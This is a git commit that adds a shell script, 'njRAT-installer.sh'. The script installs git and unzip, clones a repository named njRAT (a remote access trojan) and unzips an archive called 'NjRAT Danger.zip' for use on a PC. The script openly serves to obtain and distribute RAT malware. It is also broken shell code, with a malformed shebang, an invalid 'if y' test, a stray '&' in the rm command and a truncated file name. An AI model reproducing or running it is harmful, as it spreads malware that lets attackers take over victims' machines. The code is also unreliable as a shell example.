dcdfe95b417a10e0c83c1fa2eba3d02332b1ef81
Dima-diep <52601543+Dima-diep@users.noreply.github.com>
2021-04-29 11:45:18 +0300

    njRAT-installer.sh

---
+++ njRAT-installer.sh
@@ -0,0 +1,18 @@
+﻿#!bin/bash
+apt install git -y
+apt install unzip -y
+cd /sdcard/
+mkdir njRAT
+cd njRAT
+git clone https://github.com/Dima-diep/njRAT
+echo "Do you want unzip njRAT now? y/n"
+if y
+then
+unzip NjRAT Danger.zip
+cd ~
+rm -rf njRAT-installer.sh
+elif n
+then
+echo "njRAT has been installed. Please, remove it on PC for using"
+cd ~
+rm &-rf njRAT-installer.s
